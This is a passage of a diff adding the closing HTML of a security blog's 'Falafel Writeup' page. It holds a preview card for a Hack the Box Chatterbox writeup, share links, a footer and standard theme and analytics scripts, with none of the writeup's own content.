+    </article>
+
+            
+
+            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/chatterbox-writeup">
+                <div class="post-card-image" style="background-image: url(/assets/images/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/chatterbox-writeup">
+                <header class="post-card-header">
+                    
+                        
+                            
+                                <span class="post-card-tags">Ctf</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">Chatterbox Writeup</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>
+  My writeup of the Hack the box Chatterbox.
+
+
+</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/christoffer/">Christoffer Claesson</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      3 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+        </div>
+    </div>
+</aside>
+
+<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
+<div class="floating-header">
+    <div class="floating-header-logo">
+        <a href="/">
+            
+                <img src="/assets/images/static/blog-icon.png" alt="Securityits.io icon" />
+            
+            <span>Securityits.io</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">&mdash;</span>
+    <div class="floating-header-title">Falafel Writeup</div>
+    <div class="floating-header-share">
+        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
+</svg>
+</div>
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Falafel+Writeup&amp;url=https://jekyllt.github.io/jasper2/falafel-writeup"
+            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+
+        </a>
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://jekyllt.github.io/jasper2/falafel-writeup"
+            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
+
+        </a>
+    </div>
+    <progress class="progress" value="0">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+
+
+<!-- /post -->
+
+<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="/">Securityits.io</a> &copy; 2025</section>
+                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
+                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
+                    <a href="https://github.com/jekyllt/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                    
+                    <a href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-115328400-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
